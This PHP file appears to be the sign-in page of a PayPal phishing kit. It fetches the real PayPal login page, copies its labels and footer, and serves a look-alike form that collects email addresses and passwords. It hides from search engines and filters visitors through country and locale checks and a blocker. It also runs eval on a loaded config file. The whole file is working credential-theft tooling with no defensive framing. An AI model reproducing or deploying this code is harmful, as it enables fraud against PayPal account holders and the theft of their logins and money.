<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

if (isset($_GET['country_x']) && isset($_GET['locale_x'])) {
  if ($_GET['country_x'] != $_SESSION['code']) {
    $api->redirect("success");
  } else if ($_GET['locale_x'] != $_SESSION['lang'] . "_" . $_SESSION['code']) {
    $api->redirect("success");
  }
} else {
  $api->redirect("success");
}

$api->visitor("Signin");

$html = $api->content("https://www.paypal.com/signin?country.x={$_SESSION['code']}&locale.x={$_SESSION['lang']}_{$_SESSION['code']}");
$title = $api->getStr($html, '<title>', '</title>');
$email = $api->getStr($html, '<label for="email" class="fieldLabel">', '</label>');
$password = $api->getStr($html, '<label for="password" class="fieldLabel">', '</label>');
$forgot = $api->getStr($html, 'pwrLink">','</a>');
$create = $api->getStr($html, 'createAccount">', '</a>');
$separator = $api->getStr($html, '<span class="textInSeparator">','</span>');
$login = $api->getStr($html, 'value="Login">', '</button>');
$required = $api->getStr($html, '<p class="emptyError hide">', '</p>');
$footer = $api->getStr($html, '</section><footer class="footer" role="contentinfo">', '</div><div class="transitioning');
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->encode($title);?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="assets/css/signin_style.css">
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/jquery.validate.js" type="text/javascript"></script>
<script src="assets/js/signin.auth.js" type="text/javascript"></script>
</head>

<body>
<div class="main">
<section class="login">
<div class="corral">
<div class="contentContainer activeContent contentContainerBordered">
<header>
<p class="logo logo-long"></p>
</header>
<div class="notifications">
<p class="notification notification-critical hide" id="notifications">
<?=$api->transcode("Please check your entries and try again.");?>
</p>
</div>
<form method="post" id="signin" autocomplete="off">
<div class="profileRememberedEmail hide" id="link">
<span class="profileDisplayPhoneCode"></span>
<span class="profileDisplayEmail" id="profileDisplayEmail"></span>
<a href="#" class="notYouLink" id="backToInputEmailLink"><?=$api->transcode("Not you?");?></a>
</div>
<div id="splitEmail" class="splitEmail">
<div id="splitEmailSection">
<div id="emailSection" class="clearfix">
<div class="textInput" id="login_emaildiv">
<div class="fieldWrapper">
<input type="text" placeholder="<?=$api->encode($email);?>" id="Email" name="email">
</div>
<div class="errorMessage" id="emailErrorMessage">
<p class="emptyError"><?=$api->encode($required);?></p>
</div>
</div>
</div>
<div class="actions">
<button class="button actionContinue login-login-click-next" type="submit" id="btnNext"><?=$api->transcode("Next");?></button>
</div>
</div>
</div>
<div id="splitPassword" class="splitPassword transformRightToLeft hide">
<div id="splitPasswordSection">
<div id="passwordSection" class="clearfix">
<div class="textInput" id="login_passworddiv">
<div class="fieldWrapper">
<input type="password" placeholder="<?=$api->encode($password);?>" id="Password" name="password">
<button type="button" class="showPassword hide show-hide-password login-show-password" id="showpassword"><?=$api->transcode("Show");?></button>
<button type="button" class="hidePassword hide show-hide-password login-hide-password" id="hidepassword"><?=$api->transcode("Hide");?></button>
</div>
<div class="errorMessage" id="passwordErrorMessage">
<p class="emptyError"><?=$api->encode($required);?></p>
</div>
</div>
</div>
</div>
<div class="actions">
<button class="button actionContinue login-login-submit" type="submit" id="btnLogin"><?=$api->encode($login);?></button>
</div>
</div>
</form>
<div class="forgotLink">
<a href="#" class="login-click-forgot-password"><?=$api->encode($forgot);?></a>
</div>
<div class="loginSignUpSeparator">
<span class="textInSeparator"><?=$api->encode($separator);?></span>
</div>
<a href="#" class="button secondary login-click-signup-button"><?=$api->encode($create);?></a>
</div>
</div>
</div>
</section>
<footer class="footer">
<?=$footer;?>
</div>
<div class="transitioning hide" id="loading"></div>
</div>
<script src="assets/js/signin.post.js"></script>
</body>

</html>
